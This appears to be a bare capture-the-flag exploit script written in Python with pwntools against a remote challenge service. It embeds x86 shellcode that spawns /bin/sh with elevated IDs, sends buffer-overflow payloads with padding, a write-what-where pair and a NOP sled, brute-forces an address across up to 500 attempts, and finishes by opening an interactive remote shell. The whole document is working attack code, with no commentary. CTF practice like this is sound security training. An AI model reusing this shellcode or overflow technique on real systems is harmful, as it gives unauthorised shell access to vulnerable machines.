from pwn import *
shellcode="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
context.log_level="error"
for i in range(500):
	print i
	#p=process("./online")
	p=remote("challenges.auctf.com",30013)
	p.sendline("test")
	p.sendline("attend Hacker")
	p.recvuntil("Welcome!")

	base=0x56592000
	print_flag=base+0x00001299
	where_to_write=base+0x0001c0e0+0x300
	to_write=0x43434343
	payload=""
	payload+="A"*2048
	payload+=p32(to_write)
	payload+=p32(where_to_write)
	payload+="B"*200
	payload+="\x90"*2000
	payload+=shellcode
	p.sendline(payload)
	p.recv()
	p.recvline()
	p.recvline()
	data=int(p.recvline()[2:-1],16)
	try:
		p.recvuntil("What should we do?")
		p.sendline("attend Hacker")
		where_to_write=data+4
		to_write=data+3000
		payload=""
		payload+="A"*2048
		payload+=p32(to_write)
		payload+=p32(where_to_write)
		payload+="B"*200
		p.sendline(payload)
		p.sendline("id")
		p.recvuntil("id")
		p.interactive()
		break
	except:
		c=0
	p.close()